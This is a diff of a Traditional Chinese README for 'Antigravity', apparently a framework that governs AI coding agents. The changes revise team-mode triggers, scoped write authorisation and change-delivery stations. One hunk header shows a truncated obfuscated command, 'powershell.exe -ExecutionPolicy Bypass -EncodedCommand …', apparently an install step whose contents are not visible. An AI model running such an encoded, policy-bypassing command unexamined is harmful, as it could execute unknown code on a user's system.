@@ -14,7 +14,8 @@ AI 編碼助手天生有幾個致命弱點，Antigravity 逐一對治：
 
 1. **跨對話失憶** — 每開新對話就忘記之前做過的架構決策 → 透過 `.agents/memory/` 記憶卡系統持久保存
 2. **無紀律執行** — 寫碼前不規劃、寫完不測試 → 20 個工作流檔案強制四拍子節奏
-3. **角色權限模糊** — 子代理人隨意改檔案，或 AI 形式上列站點卻仍全部主線直做 → 編程意圖自動進入隊長制團隊模式，先產出草案包，範圍綁定的意圖訊號經授權解析綁定後，轉正式派工板並逐波次派工；證據型站點預設使用唯讀 evidence branch，實作隊員只能在受治理隔離區產出變更交付件，或在無隔離時產出文字變更交付件，審查者不能實作同一交付物；隊長任務只限總監溝通、授權解析、建板、派工、監督、接收交付、彙整狀態、處理阻塞與授權邊界、回報
+3. **角色權限模糊** — 子代理人隨意改檔案，或 AI 形式上列站點卻仍全部主線直做 → 使用者要求 governance、workflow、fix、build、debug、test、audit、skill、memory/docs、commit、handoff、source、public-contract 等受治理工作時，即視為使用者要求啟動隊長制團隊模式；不需固定口令。
+   Team mode 啟動只建立治理與派工狀態，不授權寫入；寫入仍需 visible plan、file scope、authorization phase、exact allowlist、dirty diff read 與 protected gate。正式執行先產出草案包，範圍綁定後轉正式派工板並逐波次派工；主工作區 implementation 由具名 station-owned `change-delivery` 站點寫入，`change-application` 只作 returned artifact、明確 integration task 或 assigned sync 的 fallback；隊長只協調、派工、監督、接收站點交付、彙整狀態、處理阻塞與授權邊界、回報
 4. **知識碎片化** — 技能散落各處，Token 暴增 → 62 套按需載入的操作型技能，不用時零開銷
 5. **語言不友善** — 工程術語充斥 → 三層語言架構（指令層英文、介面層繁中、橋接層雙語）
 6. **框架升級斷裂** — 升級怕覆蓋記憶或脈絡 → D06 安全網 + SHA256 差異比對 + 知識資產永久保護
@@ -72,8 +73,9 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand WwBOAGUAdAAuAF
 | **按需載入** | 技能僅在需要時載入，減少 AI 的認知負擔和 Token 消耗 |
 | **需求對齊與反證** | 架構藍圖與建構計畫必須先回放需求、列出非目標與成功標準，再做中立反證、決策紀錄、驗收追蹤與偏移稽核 |
 | **繁體中文特化** | 三層語言架構：指令層（英文）、介面層（繁體中文）、橋接層（雙語） |
-| **Team-Native Core 團隊原生核心** | 開發、修改、修復、測試、除錯、健檢、提交、交接、技能鍛造，以及會影響後續建構的 00 證據型對話、探索、架構、廣泛讀檔與外部研究，都會依語意自動進入 Team-Native Core。這不是文字建議，而是前置執行狀態機：下一個合法狀態必須是隊長任務板、適用站點、隊員派工包與通道狀態。Antigravity / Gemini 唯讀工作使用正式唯讀板，寫入工作必須進入由範圍綁定的意圖訊號或介面確認經授權解析綁定後的正式寫入板；每站都要記錄隊員技能引用、深讀範圍、隊長交付接收與授權處理範圍、啟動期限、待命原因或阻塞原因。00 直答只保留給不需外部證據的純聊天；涉及檔案、截圖、記憶、規則、代理行為、工具輸出或後續治理影響時，必須升級為正式唯讀團隊站點。站點以 adapter 或 conditional 路由為主，可轉成 Gemini CLI、`@` 指派、browser-capable agent、IDE workflow、plugin adapter、瀏覽器或命令列證據；若通道不可用，必須先回報 unavailable、blocked、unverified、not-authorized 或 standby，不得默默降級成 routine direct。正式團隊完成必須回收 implementation change delivery、memory delivery、review、validation 四類交付件與 Team-Native trace；隊長只接收交付、維持任務板、彙整狀態、處理阻塞與授權邊界，不能先自行讀完、實作、審查或驗證再事後補團隊軌跡 |
+| **Team-Native Core 團隊原生核心** | Team-Native 由使用者要求受治理工作觸發：governance、workflow、fix、build、debug、test、audit、skill、memory/docs、commit、handoff、source、public-contract，或要求團隊、隊員、subagent、delegation、Team-Native。使用者不需要固定口令。純對話、小型穩定問答與無 source/governance/evidence 影響的工作可維持 direct；Team mode 啟動不等於寫入授權。啟動後，下一個合法狀態必須是隊長任務板、適用站點、隊員派工包與通道狀態；主工作區 implementation 由具名 station-owned `change-delivery` 站點依 `implementation-change-delivery`、精確 allowlist、dirty diff read 與禁止受保護動作寫入，`change-application` 只作 returned artifact、明確 integration task 或 assigned generated/deployed sync 的 fallback。站點以 adapter 或 conditional 路由為主，可轉成 Gemini CLI、`@` 指派、browser-capable agent、IDE workflow、plugin adapter、瀏覽器或命令列證據；若通道不可用，必須先回報 unavailable、blocked、unverified、not-authorized 或 standby，不得默默降級成 routine direct。正式團隊完成必須回收 implementation change delivery、memory delivery、review、validation 四類交付件與 Team-Native trace；隊長只接收交付、維持任務板、彙整狀態、處理阻塞與授權邊界，不能先自行讀完、實作、審查或驗證再事後補團隊軌跡 |
 | **範圍式授權解析** | Antigravity workflow 按鈕、IDE 確認、`task_boundary` 模式、GO 與工具確認都必須收斂到目前明示的計畫、站點、命令、工具或檔案集合；workflow 入口只做路由，介面同意可作為該提示範圍的授權證據，但不是無範圍寫入或記憶/git/release 授權 |
+| **輸出與接地雙閘門** | Antigravity core 只保留總監輸出繁中語義先行與高變動/外部事實接地查證的最小契約；細節引用 `Shared/policies/language-governance.md` 與 `Shared/policies/grounding-governance.md`。source/deployed sync 以 `Antigravity/.agents/rules/00_core_identity.md` 與 `.agents/rules/00_core_identity.md` 雜湊一致為準 |
 | **三位一體治理** | 靜默異常中斷（閘門攔截時才中斷）+ 風險關閉請求或覆寫請求紀錄（`[SUDO]` 只記錄請求，不跳過 scoped authorization、Team-Native、validation、review、protected gates，也不支援 `complete` 宣稱）+ 雙軌沙盒（生產 / 草圖） |
 
 ---
@@ -145,7 +147,7 @@ graph TB
 | **Shared policy drift** | Doctor 檢查 Antigravity / Gemini adapter marker block 是否仍由框架來源 `Shared/policies/subagent-invocation.md` 生成，並確認下游 `.agents/shared/policies/subagent-invocation.md` 已部署 |
 | **Subagent vocabulary drift** | Doctor 檢查 Shared 技能是否誤把平台工具名寫成共用語義，避免 Antigravity、Claude、Codex 的委派語彙互相污染 |
 | **Review governance coverage** | Doctor 檢查審查治理共用技能、工作流矩陣、子代理政策與 02/03/04/08/09/10 入口是否保留審查狀態與 evidence branch 邊界 |
-| **Captain-led programming governance coverage** | Doctor 檢查隊長制編程治理共用技能、團隊任務板模板、任務類型閘門、派工前置閘門、隊長最小執行權規則、隊長任務板、角色邊界、隔離變更交付、文字變更交付、證據負責人、主線直做例外、全主線假團隊防線、00/01 自動轉向、Antigravity workflow 接入與部署後 shared skill / shared reference hash 是否一致；也會檢查 draft-to-formal board lifecycle、dispatch wave、previous-wave input、next-wave start condition、formal evidence eligibility，並攔截草案板派工、草案證據冒充正式驗收與一次開全部隊員 |
+| **Captain-led programming governance coverage** | Doctor 檢查隊長制編程治理共用技能、團隊任務板模板、受治理請求觸發、任務類型閘門、派工前置閘門、隊長最小執行權規則、隊長任務板、角色邊界、station-owned main-worktree change delivery、fallback change-application、證據負責人、主線直做例外、全主線假團隊防線、Antigravity workflow 接入與部署後 shared skill / shared reference hash 是否一致；也會檢查 draft-to-formal board lifecycle、dispatch wave、previous-wave input、next-wave start condition、formal evidence eligibility，並攔截草案板派工、草案證據冒充正式驗收與一次開全部隊員 |
 | **Team-Native Core coverage** | Doctor 檢查 Team-Native Core 政策、任務軌跡契約、conditional 平台路由、Team-Native trace 驗收與部署後共用參考；嚴格模式可要求任務軌跡 |
 | **孤兒偵測** | 偵測源碼已刪除但目標仍存在的「孤兒檔案」，標記為 `ORPHAN` 提醒 |
 | **衍生技能補建** | 每次部署自動掃描 `project_skills/`，補建缺少的符號連結 |
@@ -173,10 +175,10 @@ graph TB
 底層規範依啟動模式分為三層：
 
 **`00_core_identity.md`** — Always On（每次對話必載）
-1. **專職化分工** — 隊長任務只限總監溝通、授權解析、建板、派工、監督、接收交付、彙整狀態、處理阻塞與授權邊界、回報，不把一般實作、測試、審查與收尾包辦為正常模式；下游 `.agents/shared/policies/subagent-invocation.md` 與框架來源 `Shared/policies/subagent-invocation.md` 只定義任務類型閘門、派工前置閘門、隊長最小執行權規則、Delegation Gate、角色互斥、隔離變更交付、假團隊防線與主線直做例外；編程工作先過隊長任務板，任何隊員不得早於任務板啟動；Antigravity / Gemini adapter 把證據型站點轉成 Gemini CLI、`@` 指派、browser-capable agent 或 plugin adapter，實作型隊員只能產出隔離變更交付或文字變更交付件，不能自我審查；不可用時標記未驗證、阻塞或 `closed-with-director-risk`（總監風險關閉但非完整）
+1. **專職化分工** — Team-Native 由使用者要求受治理工作觸發後，隊長任務只限總監溝通、授權解析、建板、派工、監督、接收交付、彙整狀態、處理阻塞與授權邊界、回報，不把一般實作、測試、審查與收尾包辦為正常模式；下游 `.agents/shared/policies/subagent-invocation.md` 與框架來源 `Shared/policies/subagent-invocation.md` 只定義任務類型閘門、派工前置閘門、隊長最小執行權規則、Delegation Gate、角色互斥、station-owned main-worktree change delivery、fallback change-application、假團隊防線與主線直做例外；未啟動 Team-Native 時，純聊天、小型穩定問答與無 source/governance/evidence 影響工作依一般生命週期、範圍式授權與寫入前讀取處理；啟動後任何隊員不得早於任務板啟動；Antigravity / Gemini adapter 把證據型站點轉成 Gemini CLI、`@` 指派、browser-capable agent 或 plugin adapter，實作型隊員使用 `change-delivery`，隔離或文字變更交付只作 fallback，不能自我審查；不可用時標記未驗證、阻塞或 `closed-with-director-risk`（總監風險關閉但非完整）
 2. **多代理人視圖透明度** — 子代理人的修改必須回傳主代理人在介面呈現
 3. **生命週期強制** — 規劃 → 驗證閘門 → 執行 → 記憶更新
-4. **禁止終端機文書處理** — 靜默閘門式攔截（`[PRE-FLIGHT GATE]`），`[SUDO]` 只留下風險關閉請求或覆寫請求紀錄；不得跳過 scoped authorization、Team-Native、validation、review、protected gates，也不得支援 `complete` 宣稱；`/03-1_experiment` 沙盒例外仍需最小站點宣告
+4. **禁止終端機文書處理** — 靜默閘門式攔截（`[PRE-FLIGHT GATE]`），`[SUDO]` 只留下風險關閉請求或覆寫請求紀錄；不得跳過 scoped authorization、Team-Native、validation、review、protected gates，也不得支援 `complete` 宣稱；`/03-1_experiment` 是受治理沙盒 workflow，請求本身啟動 Team mode 並使用 reduced/minimal experiment station/board，但 sandbox writes、discard 與 promotion 仍需 scope-bound authorization，且不得宣稱 production completion
 5. **繁體中文特化** — 三層語言架構（指令層、介面層、橋接層）
 
 **`01_cross_lingual_guard.md`** — Always On（每次對話必載）
@@ -191,7 +193,7 @@ graph TB
 3. **技能系統契約** — 按需載入、漸進式揭露、三目錄架構（衍生技能詳見 `05_project_skill_contract.md`）
 
 **`02_code_quality_security.md`** — Model Decision（寫程式碼時載入）
-1. **機密隔離** — `[SEC SILENT GATE]` 靜默掃描，`[SUDO]` 只留下風險關閉請求或覆寫請求紀錄，不授權寫入或揭露明文機密；`/03-1_experiment` 沙盒例外仍需標示邊界與升級條件
+1. **機密隔離** — `[SEC SILENT GATE]` 靜默掃描，`[SUDO]` 只留下風險關閉請求或覆寫請求紀錄，不授權寫入或揭露明文機密；`/03-1_experiment` 沙盒例外仍需 reduced/minimal experiment station/board、sandbox scope、升級條件與 scope-bound authorization，且不得宣稱 production completion
 2. **驗證器鐵律** — `[LINTER GATE]` 最多 3 次自動修復，超限硬性中斷
 3. **橫切品質約束** — 安全/品質/介面/測試的核心原則
 
@@ -271,11 +273,11 @@ graph LR
 
 | 編號 | 指令名稱 | 功能 | 角色權限 |
 |------|---------|------|---------|
-| 00 | 討論 | 純對話、腦力激盪、無外部證據依賴的輕量問答；檔案、截圖、記憶、規則、代理行為或治理影響改走正式唯讀團隊站點 | Reader |
+| 00 | 討論 | 純對話、腦力激盪、無外部證據依賴的輕量問答；未啟動 Team mode 時，涉及檔案、截圖、記憶、規則、代理行為或治理影響仍依一般唯讀/授權流程處理；Team mode 因受治理請求或團隊派工啟動後改走正式唯讀團隊站點 | Reader |
 | 01 | 探索 | 可行性研究，雙狀態魔鬼代言人（純搜索 / 深度分析） | Reader |
 | 02 | 架構 | 需求轉化為技術藍圖與記憶系統初始化 | Writer/SRE |
 | 03 | 建構計畫 | Stage 1：記憶載入 → Diff 規劃 → 等待範圍綁定的意圖訊號與授權解析（含沙盒快速路徑） | Writer/SRE |
-| 03-1 | 實驗 | 沙盒快速實驗（保留最小團隊站點宣告） | Experiment Worker |
+| 03-1 | 實驗 | 沙盒快速實驗（受治理 workflow；要求 03-1/experiment/sandbox prototype 會啟動 Team mode，使用 reduced/minimal experiment station/board；sandbox 寫入與 promotion 仍需 scope-bound authorization，且不宣稱 production complete） | Experiment Worker |
 | 03-2 | 建構執行 | Stage 2：正式派工板 → 第 1 波變更交付件 → 回收證據 → 達到下一波啟動條件後再派審查/驗證交付件 → 授權變更套用站點處理合格交付件 → 新建歸卡 → 記憶更新 → 真實執行驗證 | Captain/SRE |
 | 05 | 濃縮 | 專案濃縮初始化（掃描 → 萃取 → 隊長任務板 → 審閱 → 寫入） | Writer/SRE |
 | 04-1 | 修復計畫 | Bug 診斷 → 產出修復計畫（唯讀，等待範圍綁定的意圖訊號與授權解析） | Reader |
